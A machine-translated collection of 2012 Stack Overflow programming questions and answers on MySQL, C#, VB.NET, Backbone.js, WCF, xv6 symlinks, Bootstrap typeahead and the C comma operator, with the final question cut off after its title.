我正在使用 RIA 服务和 Mysql 数据库的 Silverlight 5 环境中工作。我有一个表，其中存储了大约 20 个不同的位置。我需要使用 Contains 或 LIKE 在可能的 20 个位置中的每个位置中检查每个记录是否存在可能的字符串匹配。如果在记录中找到位置匹配，我只需要该记录中的几个字段。不是来自其他 19 个地点的数据。如果正在检查的记录中没有匹配项，则不会保存任何内容。我对RIA不知所措。我可以用 20 or's 编写查询，但是当找到匹配项时，将返回整个记录，这将显示在数据网格中，并且由于搜索字段可能位于 20 个位置中的 1 个，我不能只隐藏不需要的字段. 可以将嵌套循环例程保存在 Mysql 函数或过程中，以便实体框架可以查询它吗？如果是这样，您能否给我一个正确方向的语法推动。提前谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-28T01:07:06.140

例如，让我假设列名为`col1`, `col2`, ..., `col20`in `your_table`。

以下查询可以帮助您获取记录中第一个找到的匹配列值。

```
SET @criteria='%searh criteria%'; -- search string
SET @none_matched=NULL; -- use this alternative if none matched
SELECT 
 IF( col1 like @criteria, col1,
     IF( col2 like @criteria, col2,
        IF( col3 like @criteria, col3,
--          // 'if's until 'col20'
            @none_matched ) ... ) as 'your_label' -- make sure you have 20 closing braces
FROM your_table; 
```

我不确定使用此类查询的性能。
或者，您可以依赖存储过程。

# c# - 触发 12 小时循环

> ID：11235628
> 
> 赞同：0
> 
> 时间：2012-06-27T22:23:14.250
> 
> 标签：c#, console-application

我不确定如何正确命名这个问题。请自由编辑。

我有一个后台控制台应用程序在我的服务器上运行。控制台应用程序不时（每 5 分钟）发送电子邮件并做一些小事。

该应用程序不是通过任务管理器每 5 分钟启动一次，它在安装过程中打开一次，并且无限循环和 thread.sleep 保持运行。因此，我无法配置任务管理器以使用特定参数打开应用程序。

现在我需要添加一个每 12 小时运行一次的任务，并且我想使用相同的应用程序。该任务包括删除和创建一些文件，但是根据每 5 分钟一次的文件日期检查自上次创建以来是否有 12 小时对我来说似乎有点不明智。

是否有一种非昂贵的方式（无数据库、无日志、无文件创建日期、无多线程）使用我拥有的相同应用程序来勾选 12 小时循环？如果没有，最好的方法是什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-27T22:31:43.447

这就是 Windows 任务计划程序的用途。重新发明已经存在的东西是没有意义的。

[http://windows.microsoft.com/en-us/windows7/Schedule-a-task](http://windows.microsoft.com/en-us/windows7/Schedule-a-task)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-27T23:25:26.613

这是一种在 UTC 午夜调度而不循环的有效方法：

```
var now=DateTime.UtcNow;
var today=now.Date;
var tomorrow=today.AddDays(1);
var dueTime=tomorrow-now;

System.Threading.Timer timer = null;
timer = new Timer(_ => {
    try
    {
        //do your thing
    }
    finally
    {
        timer.Dispose();
    }
},null,dueTime,TimeSpan.FromMilliseconds(-1d)) 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-27T23:32:12.173

据我了解，您已经有一个等待 5 分钟然后执行任务 A 的循环。现在您想要添加任务 B 以每 12 小时运行一次。我要么用 Timer 对象替换两者，要么在任务 A 运行时每 5 分钟检查一次任务 B 已经运行了多长时间。如果它至少 12 小时，则运行任务 B。类似于

```
if (last12HourRun.Subtract(DateTime.Now).TotalHours > 12)
  // run task B
  last12HourRun = DateTime.Now; 
```

# vb.net - 从字符串“”到类型“Double”的转换无效。在 VB.NET 中

> ID：11235630
> 
> 赞同：1
> 
> 时间：2012-06-27T22:23:20.370
> 
> 标签：vb.net, calculator

一般来说，我对编程完全陌生，我决定制作一个简单的小计算器作为我的第一个项目。

我一直收到“从字符串转换”到类型“双”的错误。” 每次我点击 ButtonPlus。

完整代码： http: [//pastebin.com/JJxkg4fy](http://pastebin.com/JJxkg4fy)

在我有 ButtonPlus 代码的底部附近，我试图将 TextBox1 中的文本转换为双精度文本。真正令人困惑的是，当我尝试分裂时它不会发生。当我按下除法按钮时，什么也没有发生。：/

```
 Private Sub ButtonPlus_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ButtonPlus.Click
    If CInt(True) Then Val1 = CDbl(TextBox1.Text)
    Opperan = "+"
    TextBox1.Clear()
    Funct.Text = "+"
End Sub

Private Sub ButtonDivide_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ButtonPlus.Click
    If CInt(True) Then Val1 = CDbl(TextBox1.Text)
    Opperan = "/"
    TextBox1.Clear()
    Funct.Text = "÷"
End Sub 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-27T22:59:08.667

假设您希望 "" 转换为 0，请尝试此操作

```
Dim val1 As Double

If Not Double.TryParse(TextBox1.Text, val1) Then
   val1 = 0
End If 
```

我想，我的VB生锈了。

PS you'll do yourself a lot of favours by picking up the .net side of things instead of relying on legacy VB6 stuff like CDbl etc.

# c# - C# 线程池 - OutOfMemoryException

> ID：11235631
> 
> 赞同：1
> 
> 时间：2012-06-27T22:23:22.050
> 
> 标签：c#, multithreading, threadpool, out-of-memory

我第一次在一个项目中使用 ThreadPools，并且需要能够在 main 方法的两个不同部分中对工作项进行排队。我制作了这个简单的示例进行测试，并且在对象创建行的任一 for 循环中不断收到 OutOfMemoryException。是否需要在线程执行结束时执行某种清理以释放该线程占用的任何内存？如果不是，我该如何解决我的内存问题？

```
class Program
{
    public static HashSet<String> domains;
    static void Main(string[] args)
    {
        //Static DB Connection
        //Database Set
        domains = new HashSet<string>();
        while (true)
        {
            //Pull Data From The Database
            String[] chars = { "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l" };
            for (int i = 0; i < 10; i++)
            {
                Loader l = new Loader(chars[i]);
                if (!domains.Contains(chars[i]))
                {
                    lock (domains)
                    {
                        domains.Add(chars[i]);
                    }
                    ThreadPool.QueueUserWorkItem(new WaitCallback(l.ThreadPoolCallback), i);
                }

            }
           for (int i = 0; i < 10; i++)
            {
                Parser p = new Parser();
                ThreadPool.QueueUserWorkItem(new WaitCallback(p.ThreadPoolCallback), i);
            }
        }
    }
} 
```

解析器类：

```
 class Parser
{
    public void ThreadPoolCallback(Object threadContext)
    {
        ManualResetEvent eventx = new ManualResetEvent(false);
        //int threadIndex = (int)threadContext;
        Console.WriteLine("Parser Thread: " + threadContext);
        eventx.Set();
    }
} 
```

装载机类：

```
class Loader
{
    String ch { set; get; }
    public Loader(String new_ch)
    {
        ch = new_ch;
    }
    public void ThreadPoolCallback(Object threadContext)
    {
        ManualResetEvent eventx = new ManualResetEvent(false);
        Console.WriteLine("Added " + this.ch + " to " + Thread.CurrentThread.GetHashCode());
        //int threadIndex = (int) threadContext;
        //Console.WriteLine("Loader Thread: " + threadContext + " " + ch + "  " + Thread.CurrentThread.GetHashCode());
        lock(Program.domains)
        {
            Program.domains.Remove(this.ch);
            Console.WriteLine("Removed " + this.ch + " from " + Thread.CurrentThread.GetHashCode());
        }
        eventx.Set();
    }

} 
```

谢谢一堆。

*编辑*感谢所有的帮助。我现在看到了我所犯的错误

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-27T22:28:44.767

你有一个无限的while循环，除了吐出新线程之外什么都不做。线程占用大量内存（32 位为 1MB；64 位为 4MB），因此如果您不先耗尽线程限制，最终您将耗尽内存。

另外——您对 ManualResetEvent 的使用不正确。它需要在方法范围之外创建，否则它什么也做不了（因为每个进入方法的线程都会创建一个新的 resetevent 对象实例；为了同步，线程必须访问同一个对象）。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-27T22:33:43.877

尽管线程池限制了线程数，但您的循环不会限制队列中用户工作项的数量。您的无限循环将耗尽内存。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-27T22:31:11.250

就像 roken 说的，字里行间的一切

```
while(true)
{
   ....
} 
```

正在无限重复。

# backbone.js - model.fetch 完成时触发事件的最佳方式

> ID：11235633
> 
> 赞同：0
> 
> 时间：2012-06-27T22:23:33.907
> 
> 标签：backbone.js, backbone-events, marionette

我正在寻找在获取完成时触发事件的最佳方式。
此代码有效，但我很想知道是否有更好的方法来完成以下任务。

```
var myApp = new Marionette.Application();

myApp.on("initialize:before", function () {
    this.currentUser = new UserModel();
    this.currentUser.fetch({
        complete: function () {
            myApp.vent.trigger('currentUser');
        }
    });
}); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-27T22:40:17.717

成功[`fetch`触发`"change"`事件](http://documentcloud.github.com/backbone/#Model-fetch)：

> **拿来** `model.fetch([options])`
> 
> [...]`"change"`如果服务器的状态与当前属性不同，将触发一个事件。

因此，如果`fetch`它有任何作用，那么`"change"`您可以收听一个：

```
myApp.on("initialize:before", function () {
    this.currentUser = new UserModel();
    this.currentUser.on('change', function() {
        myApp.vent.trigger('currentUser');
    });
    this.currentUser.fetch();
}); 
```

如果以其他方式更改并且这可能是也可能不是您想要的，那也会触发一个`"currentUser"`事件。`this.currentUser`如果您只想调用一次您的函数，那么您当前的`success`处理程序可能是最容易做的事情；`on`当它被调用时，您仍然可以使用和取消绑定处理程序：

```
myApp.on("initialize:before", function () {
    var triggerCurrentUser = _.bind(function() {
        myApp.vent.trigger('currentUser');
        this.currentUser.off('change', triggerCurrentUser);
    }, this);

    this.currentUser = new UserModel();
    this.currentUser.on('change', triggerCurrentUser);
    this.currentUser.fetch();
}); 
```

您也可以使用[`_.once`](http://documentcloud.github.com/underscore/#once)，但这会留下一个无操作回调函数，并且没有必要这样做。

# database - 不同数据库中的主机名是什么？

> ID：11235635
> 
> 赞同：0
> 
> 时间：2012-06-27T22:24:42.393
> 
> 标签：database

问题：
如何在 MySQL 和 SQL server 中找到主机名？
主机名是否与@@servername 相同？

//

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-27T22:27:34.130

在 MySQL 中，您可以执行以下操作：

```
mysql> show variables like 'hostname'; 
```

# wcf - 给定 wsdl，快速轻松地实现 WCF Web 服务？

> ID：11235638
> 
> 赞同：6
> 
> 时间：2012-06-27T22:25:11.893
> 
> 标签：wcf, visual-studio-2010, wsdl

我正在编写一个客户端来访问将由第三方托管的 SOAP Web 服务。我有定义接口和数据的 WSDL 和 XSD。

我从 WSDL 创建服务引用没有问题，但是我在构建一个实现它的简单 Web 服务时遇到了问题，我可以用它来测试。（第三方的服务还没有准备好，但即使它正在运行，我仍然想对我自己的测试服务器进行初始测试，而不是针对他们的。）

我四处浏览，显然我可以使用 svcutil 为服务生成一个接口：

```
svcutil.exe thewsdl.wsdl thexsd.xsd /language:c# /out:ITestService.cs 
```

这会生成一个包含服务接口定义的文件。但现在呢？

我认为最简单的方法是构建一个自托管服务，因此我创建了一个新的控制台应用程序，并在其中实现了一个从服务接口定义派生的类，并使用 ServiceHost 启动它。

它运行，当它运行时，我能够在我的客户端应用程序中创建一个服务引用。但是当我尝试从客户端应用程序调用它时，我收到一个错误：

```
The provided URI scheme 'http' is invalid; expected 'https'. 
```

解决这个问题的最简单方法是什么？有没有一种简单的方法可以简单地关闭身份验证和授权，并简单地允许不受限制的访问？

编辑：

我正在为此增加赏金，因为最初的问题似乎没有引起注意。

但是，让我们进入症结所在。我正在尝试针对客户的 SOAP 服务编写客户端。作为开发的一部分，我想创建自己的测试 WCF 服务，它实现了相同的 WSDL。

所以我有一个下载的 .wsdl 文件和一个关联的 .xsd 文件，我想用它们创建一个可以使用 VS2010 调试器进行测试的服务。

这个服务是独立运行，还是在 IIS 中运行，或者它是生产稳定的，对我来说并不重要。我想要的只是接受客户站点将接受的请求的服务，并将响应返回给我需要它返回的客户，以测试我对它们的处理。

我如何到达那里？我尝试添加 WCF 服务库，然后在其中使用 svcutil.exe 添加我的新服务，但它似乎没有使用服务器端样板填充 app.config，我尝试重建它没有没用。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-04T05:19:01.113

因为您想要一个完整的服务来调用而不是模拟它。

按着这些次序：

1.  创建新的“WCF 服务应用程序”项目
2.  将 wsdl 和 xsd 复制到项目中
3.  选择您的 wsdl 文件并查看属性部分并从完整路径复制位置
4.  右键单击解决方案资源管理器中的项目并选择“添加服务引用...”
5.  对于服务地址，粘贴在上一步中复制的 wsdl 的位置，然后点击 go。它应该显示您期望的服务操作。
6.  点击确定
7.  它应该为您生成所有对象，包括接口和配置文件（尽管此时是配置中的客户端 - 我们必须将其切换为服务）
8.  现在您应该在 system.serviceModel 部分中添加服务配置部分。由于我不知道您的 wsdl 的细节，您应该做的是在 system.serviceModel 部分中创建服务节点并从生成的客户端节点复制端点节点。例如下面的服务节点，您现在可以空白地址：

> ```
>  <system.serviceModel>
>     <services>
>       <service name="YourService">
>         <endpoint address=""
>                binding="basicHttpBinding" bindingConfiguration="WeatherSoap"
>                contract="ServiceReference1.WeatherSoap" name="WeatherSoap" />      
>       </service> 
> ```

1.  删除配置中的客户端节点
2.  在服务中，它在生成项目时实现了一个不同的接口，因此您需要将实现的接口替换为上面端点的合同属性中列出的接口。然后实现它的成员，它应该爆炸可用的操作。您可以填写您希望服务操作返回的任何内容。
3.  根据 wsdl 中的内容，我们可能需要做更多的事情来允许必要的绑定运行——比如设置 wsHttpbinding、netTCPbinding 等。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-03T06:59:31.957

我用[Moq](http://code.google.com/p/moq/wiki/QuickStart)来处理这个问题。基本上在单元测试中，您指定接口（这将通过添加服务引用或使用 svcutil 为您生成）以及如果您调用它，您希望它返回什么。

下面的示例设置：

```
var mock = new Mock<IFoo>();
mock.Setup(foo => foo.DoSomething("ping")).Returns(true); 
```

那么，当您想最小起订量您的服务电话时

```
var myObject = new IFoo;
var resp = myObject.DoSomething("whateverwillbeoverriddenbyping"); 
```

和resp将是真实的。

除了使用 Moq，还有其他选择。这些选项都涉及采用接口并注入它的不同版本。例如，您还可以通过将接口传递给类构造函数来进行构造函数注入模拟。

# java - 我可以强制我的 excel 工作簿关闭访问数据库连接吗？

> ID：11235641
> 
> 赞同：1
> 
> 时间：2012-06-27T22:25:29.467
> 
> 标签：java, excel, ms-access, scheduled-tasks

我有一个用 Java 编写的简单服务器，它为我的客户端应用程序提供来自访问数据库 (.accdb) 的数据

数据来自数据库中的查询，该查询将来自链接的 Excel 工作簿 (.xlsx) 中的多个工作表的数据组合在一起

这没有成功，因为所有者需要定期更新 excel 工作簿，并且数据库需要恒定的正常运行时间，并且当数据库打开时，excel 会锁定文件。

所以为了规避这个问题，我将数据库更改为运行工作簿的副本。我编写了一个批处理脚本来杀死 java 服务器，从而关闭与数据库的连接并解锁复制的 excel 工作簿。然后它将原始内容复制到复制的文件位置，并重新启动服务器，从而更新数据库中的数据。我将 Windows 任务计划程序设置为每天运行此批处理文件。

马虎的解决方案，但它的工作。或者我是这么想的。批处理文件只运行一次，从那以后就没有运行过。

因此，在我为此扔另一个创可贴之前，我想我会在这里问。当特定用户需要访问文件时，是否可以设置原始 Excel 工作簿以关闭所有连接？如果我能做到这一点，我所要做的就是让我的服务器在断开连接后尝试重新连接，这应该不难。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-28T04:51:56.023

我一直在努力思考这个问题并找到一个更好的解决方案，但在我的机器上我没有遇到你描述的任何问题。服务器和您的客户端是否在不同的机器上？当我更新工作簿中的某些内容时，Access 会自动看到它，尽管它们都在同一台机器上打开。可能是当时 Access 实际上并没有对数据做任何事情。

无论哪种方式，您可能需要考虑仍然像以前一样使用副本并将此宏添加到 ThisWorkbook 对象下：

```
Private Sub Workbook_BeforeSave(ByVal SaveAsUI As Boolean, Cancel As Boolean) 
 ' code to overwrite the databasecopy here
 ' use the Shell() procedure to run system commands to shutdown the database connections
 ' as you need
End Sub 
```

这样您仍然可能需要关闭服务器，但至少您可以立即执行此操作，并且仅在更新工作簿时执行。

另外，我环顾了您提出的实际问题，但没有发现任何确切的问题。您也许可以尝试这样的事情：

```
Set ActiveWorkbook.Connections() = Nothing 
```

如果你能找出连接的索引。或者也许遍历所有这些，然后重新启动它们。目前没有时间尝试确定此解决方案是否有效。希望它能让你站稳脚跟。

# c - 操作给定路径的递归函数

> ID：11235643
> 
> 赞同：1
> 
> 时间：2012-06-27T22:25:58.977
> 
> 标签：c, recursion, symlink, filepath, xv6

我正在修改教学 OS xv6（用 c 编写）以支持符号链接（AKA 快捷方式）。符号链接是 T_SYM 类型的文件，其中包含指向其目标的路径。为此，我编写了一个递归函数，它获取路径和缓冲区并用“真实”路径填充缓冲区（即，如果路径包含链接，则应将其替换为真实路径，并且链接可能发生在路径中的任何级别）。

基本上，如果我有一个路径 a/b/c/d，以及从 f 到 a/b 的链接，那么以下操作应该是等效的：

cd a/b/c/d

cd f/c/d

现在，代码已经写好了，但我试图解决的问题是路径以“/”开头的问题（意味着路径是绝对的而不是相对的）。现在，如果我使用名为 /dir1 的路径运行它，它会将其视为 dir1（相对而不是绝对）。

这是主函数，它调用递归函数。pathname 是给定的路径，buf 将包含真实路径。

```
int readlink(char *pathname, char *buf, size_t bufsize){
    char name[DIRSIZ];
    char realpathname[100];

    memset(realpathname,0,100);
    realpathname[0] = '/';

    if(get_real_path(pathname, name, realpathname, 0, 0)){
       memmove(buf, realpathname, strlen(realpathname));
       return strlen(realpathname);
    }

    return -1; 
} 
```

这是递归部分。该函数返回一个 inode 结构（表示系统中的文件或目录）。它在 realpath 中构建真实路径。ilock 和 iunlock 被用来安全地使用 inode。

```
struct inode* get_real_path(char *path, char *name, char* realpath, int position){
    struct inode *ip, *next;
    char buf[100];
    char newpath[100];

    if(*path == '/')
        ip = iget(ROOTDEV, ROOTINO);// ip gets the root directory
    else
        ip = idup(proc->cwd); // ip gets the current working directory

    while((path = skipelem(path, name)) != 0){name will get the next directory in the path, path will get the rest of the directories
        ilock(ip);
        if(ip->type != T_DIR){//if ip is a directory
            realpath[position-1] = '\0';
            iunlockput(ip);
            return 0;
        }

        if((next = dirlookup(ip, name, 0)) == 0){//next will get the inode of the next directory
            realpath[position-1] = '\0';
            iunlockput(ip);
            return 0;
        }
        iunlock(ip);

        ilock(next);

        if (next->type == T_SYM){ //if next is a symbolic link
            readi(next, buf, 0, next->size); //buf contains the path inside the symbolic link (which is a path)
            buf[next->size] = 0;
            iunlockput(next);

            next = get_real_path(buf, name, newpath, 0);//call it recursively (might still be a symbolic link)

            if(next == 0){
                realpath[position-1] = '\0';
                iput(ip);

                return 0;
            }

            name = newpath;
            position = 0;
        }     
        else
        iunlock(next);

        memmove(realpath + position, name, strlen(name));
        position += strlen(name);
        realpath[position++]='/';
        realpath[position] = '\0';

        iput(ip);

        ip = next;
    }  
    realpath[position-1] = '\0';

    return ip;
} 
```

我尝试了很多方法来做到这一点，但没有成功。如果有人看到问题，我很乐意听到解决方案。谢谢， 埃亚尔

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-28T15:47:41.180

我认为很明显，运行后`get_real_path(pathname, name, realpathname, 0, 0)`不可能`realpathname`以斜线开头。

如果函数成功执行，则`memmove(realpath + position, name, strlen(name))`确保以`realpath`开头`name`，因为`position`变量在第一次调用时始终包含零`memmove`。我建议像

```
if(*path == '/') {
   ip = iget(ROOTDEV, ROOTINO); // ip gets the root
   realpath[position++] = '/';  
} else
   ip = idup(proc->cwd); // ip gets the current working directory 
```

PS我不知道你为什么`realpathname`在执行之前在前面加上一个斜杠`get_real_path`，因为此时你并不知道提供的路径是否是绝对路径。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-01T08:14:20.517

好的，找到了问题...问题比我想象的要深...不知何故，realpath 有时会在没有明显原因的情况下更改...但原因是行：name = newpath;

解决方案是将该行更改为 strcpy(name,newpath);

上一行在名称和真实路径之间建立了绑定......如果我们不处理软链接，这可能没问题。当取消引用子路径时，这个绑定毁了一切。

感谢您的尝试

# javascript - twitter bootstrap typeahead（未定义的方法'toLowerCase'）

> ID：11235644
> 
> 赞同：22
> 
> 时间：2012-06-27T22:26:19.773
> 
> 标签：javascript, json, twitter-bootstrap, typeahead.js, typeahead

我正在尝试使用 twitter bootstrap 从我的数据库中获取制造商。

因为 twitter bootstrap typeahead 不支持 ajax 调用，所以我使用这个 fork：

[https://gist.github.com/1866577](https://gist.github.com/1866577)

在那个页面中有这个[评论](https://gist.github.com/1866577#gistcomment-307488)提到了如何做我想做的事。问题是当我运行我的代码时，我不断得到：

> 未捕获的类型错误：无法调用未定义的方法“toLowerCase”

我四处搜索并尝试将我的 jquery 文件更改为使用缩小和非缩小以及托管在谷歌代码上的文件，但我一直收到同样的错误。

我的代码目前如下：

```
$('#manufacturer').typeahead({
    source: function(typeahead, query){
        $.ajax({
            url: window.location.origin+"/bows/get_manufacturers.json",
            type: "POST",
            data: "",
            dataType: "JSON",
            async: false,
            success: function(results){
                var manufacturers = new Array;
                $.map(results.data.manufacturers, function(data, item){
                    var group;
                    group = {
                        manufacturer_id: data.Manufacturer.id,
                        manufacturer: data.Manufacturer.manufacturer
                    };
                    manufacturers.push(group);
                });
                typeahead.process(manufacturers);
            }
        });
    },
    property: 'name',
    items:11,
    onselect: function (obj) {

    }
}); 
```

在 url 字段上，我添加了

> window.location.origin

避免已经在另一个问题上讨论过的任何问题

同样在我使用之前`$.each()`，然后决定在[类似的问题](https://stackoverflow.com/questions/9232748/twitter-bootstrap-typeahead-ajax-example/11147113#comment14731742_11147113)`$.map()`中使用推荐的 Tomislav Markovski

任何人都知道为什么我一直遇到这个问题？！

谢谢

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-11-01T00:22:55.967

Typeahead 期望字符串列表作为源

```
$('#manufacturer').typeahead({
    source : ["item 1", "item 2", "item 3", "item 4"]
}) 
```

* * *

在您的情况下，您想将它与对象列表一起使用。这样，您必须进行一些更改才能使其正常工作

这应该有效：

```
$('#manufacturer').typeahead({
    source: function(typeahead, query){
        $.ajax({
            url: window.location.origin+"/bows/get_manufacturers.json",
            type: "POST",
            data: "",
            dataType: "JSON",
            async: false,
            success: function(results){
                var manufacturers = new Array;
                $.map(results.data.manufacturers, function(data){
                    var group;
                    group = {
                        manufacturer_id: data.Manufacturer.id,
                        manufacturer: data.Manufacturer.manufacturer,

                        toString: function () {
                            return JSON.stringify(this);
                        },
                        toLowerCase: function () {
                            return this.manufacturer.toLowerCase();
                        },
                        indexOf: function (string) {
                            return String.prototype.indexOf.apply(this.manufacturer, arguments);
                        },
                        replace: function (string) {
                            return String.prototype.replace.apply(this.manufacturer, arguments);
                        }
                    };
                    manufacturers.push(group);
                });
                typeahead.process(manufacturers);
            }
        });
    },
    property: 'manufacturer',
    items:11,
    onselect: function (obj) {
        var obj = JSON.parse(obj);

        // You still can use the manufacturer_id here 
        console.log(obj.manufacturer_id);

        return obj.manufacturer;
    }
}); 
```

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2012-09-17T03:35:35.520

就我而言，我遇到了这个确切的错误，结果证明我使用的 Bootstrap 版本（2.0.4）不支持将函数传递给`source`设置。

升级到 Bootstrap 2.1.1 解决了这个问题。

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2012-06-29T00:30:14.973

**更新/修订后的问题：** 当我在不支持 AJAX 的引导程序中使用原始 Typeahead 扩展时，我出现了您提到的错误“无法调用未定义的方法 'toLowerCase'”。（如您所见）您确定没有加载原始的预先输入扩展名，而不是您修改后的扩展名吗？

我已经成功地[使用了这个 typeahead 的 Gist，](https://gist.github.com/2712048)它与你提到的稍有不同。一旦我切换到那个 Gist 并确认输入数据是好的（测试输入是 JS 对象中的字符串数组，问题就消失了。

希望这可以帮助

* * *

原答案：

发生错误的原因是传递给预输入匹配器函数的值未定义。这只是发生在您的输入和匹配器函数之间某处的实际问题的副作用。我怀疑“制造商”阵列有问题。首先测试它以验证您有一个有效的数组。

```
// It appears your array constructor is missing ()
// try the following in your binding code:
var manufacturers = new Array(); 
```

这是我用来将输入绑定到预先输入的内容。我确认它适用于您修改后的 typeahead fork。

我的 HTML：

```
<!-- Load bootstrap styles -->
<link href="bootstrap.css" rel="stylesheet" type="text/css" />
...

<input type="text" class="typeahead" name="Category" id="Category" maxlength="100" value="" />

...
<!-- and load jQuery and bootstrap with modified typeahead AJAX code -->
<script src="jquery-1.7.2.min.js" type="text/javascript"></script>
<script src="bootstrap-modified-typeahead.js" type="text/javascript"></script> 
```

我的绑定 JavaScript 代码：

```
// Matches the desired text input ID in the HTML
var $TypeaheadInput = $("#Category");  

// Modify this path to your JSON source URL
// this source should return a JSON string array like the following:
// string[] result = {"test", "test2", "test3", "test4"}
var JsonProviderUrl = "../CategorySearch";

// Bind the input to the typeahead extension
$TypeaheadInput.typeahead({
    source: function (typeahead, query) {
        return $.post(JsonProviderUrl, { query: query }, function (data) {
            return typeahead.process(data);
        });
    }
}); 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2014-03-24T04:33:18.303

就我而言，我的源数组中有空值导致此错误。

人为的例子：

```
source : ["item 1", "item 2", null, "item 4"] 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-07-18T09:18:01.447

您的制造商对象没有“名称”属性，您应该更改

```
property: 'name', 
```

至

```
property: 'manufacturer', 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2013-06-24T06:40:18.053

您是否尝试过使用下面示例中的映射变量，当您的对象中有多个属性时，您需要使用它；

```
source: function (query, process) {
        states = [];
        map = {};

        var data = [
            {"stateCode": "CA", "stateName": "California"},
            {"stateCode": "AZ", "stateName": "Arizona"},
            {"stateCode": "NY", "stateName": "New York"},
            {"stateCode": "NV", "stateName": "Nevada"},
            {"stateCode": "OH", "stateName": "Ohio"}
        ];

        $.each(data, function (i, state) {
            map[state.stateName] = state;
            states.push(state.stateName);
        });

        process(states);
    } 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2013-09-09T00:03:44.507

试试这个代码：

```
String.prototype.hashCode = function(){
var hash = 0;
if (this.length == 0) return hash;
for (i = 0; i < this.length; i++) {
    char = this.charCodeAt(i);
    hash = ((hash<<5)-hash)+char;
    hash = hash & hash; // Convert to 32bit integer
}
return hash;
};

var map_manufacter, result_manufacters;
$('#manufacturer').typeahead({
source: function(typeahead, query){
    $.ajax({
        url: window.location.origin+"/bows/get_manufacturers.json",
        type: "POST",
        data: "",
        dataType: "JSON",
        async: false,
        success: function(results){

            result_manufacter = [], map_manufacters = {};
            $.each(results.data.manufacturers, function(item, data){                    
                map_manufacters[data.Manufacturer.manufacturer.hashCode()] = data;
                result_manufacters.push(data.Manufacter.manufacter);
            });             
            typeahead.process(result_manufacters);                
        }
    });
},
property: 'name',
items:11,
onselect: function (obj) {
    var hc = obj.hashCode();
    console.log(map_manufacter[hc]);
} 
```

});

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2013-04-15T14:26:23.543

不久前我偶然发现了这个问题。我建议您重新检查包含`typeahead`库的配置（通过 main.js、app.js 或 config.js）。

[否则，您可以将最新的 Bootstrap 版本](http://twitter.github.io/bootstrap/index.html)覆盖到您的应用程序库中。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2015-06-19T02:17:31.510

我解决了这个问题，只将文件 bootstrap3-typeahead.min.js 更新到[https://github.com/bassjobsen/Bootstrap-3-Typeahead/blob/master/bootstrap3-typeahead.min.js中的文件](https://github.com/bassjobsen/Bootstrap-3-Typeahead/blob/master/bootstrap3-typeahead.min.js)

我想大多数人都可以这样解决。

# c - 如何获取两个元组的最后一个元素以外的元素？

> ID：11235645
> 
> 赞同：3
> 
> 时间：2012-06-27T22:26:23.330
> 
> 标签：c, tuples

在 C 中，当我制作任何 n 元组并尝试使用它时，我只能使用它的最后一个元素。甚至类型显然是元组的最后一个元素，而不是元组本身。如何获取除最后一个元素之外的元素？我快速浏览了规范，什么也没看到。

例子：

```
#include <stdio.h>

int f() {return 2;}
char* g() {return "dudebro";}

int main() {
    printf("%d\n", (f(),g(),3)); /* Should print the address of the tuple (unless it's by-value, in which case it should be a compile error) but prints the last element?*/
    return 0;
} 
```

运行：

```
$ gcc -ansi -pedantic -Wall -Wextra tt.c -o tt
$ ./tt
3 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-27T22:27:35.813

C 中没有元组之类的东西。你所拥有的是[*逗号运算符*](http://en.wikipedia.org/wiki/Comma_operator)的使用。

如果要在 C 中整理相关数据，则需要定义和使用 struct。如果要打印出所有数据项，则需要`printf`对每个数据项进行显式调用（或使用多个格式说明符）。

例如

```
typedef struct Foo {
    int a;
    char *b;
};

Foo foo;
foo.a = 5;
foo.b = "hello";

printf("%d %s\n", foo.a, foo.b); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-27T22:32:44.410

当你像这样将一堆值放在逗号中时，C 将丢弃除最右边的值之外的所有值。它将评估 F 和 G，然后忽略它们。我不太确定为什么你认为应该发生的事情应该发生。

# javascript - 在 Visual Studio 2012 RC 中，如何调试 javascript IntelliSense 扩展？

> ID：11235646
> 
> 赞同：1
> 
> 时间：2012-06-27T22:26:29.950
> 
> 标签：javascript, visual-studio-2012, javascript-intellisense

[MSDN 文档](http://msdn.microsoft.com/en-us/library/hh874692%28v=vs.110%29.aspx)描述了扩展 JavaScript IntelliSense for Visual Studio 2012 RC 的方法。有没有办法调试，或者至少记录到一些输出，任何自定义扩展工作？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-27T22:46:14.340

哈至少通过探索发现了输出日志。

```
if(intellisense) {
    intellisense.logMessage("hi!");
} 
```

这会将输出写入输出窗口中的“JavaScript 语言服务”。

![JavaScript 语言服务输出](../Images/26bff4f6d651e769f3e36cd1a881283b.png)

现在关于调试？:)

# objective-c - 自定义 iOS UILocalNotification 声音不播放（可能与 Xcode 更新有关）

> ID：11235650
> 
> 赞同：7
> 
> 时间：2012-06-27T22:27:03.380
> 
> 标签：objective-c, ios, uilocalnotification

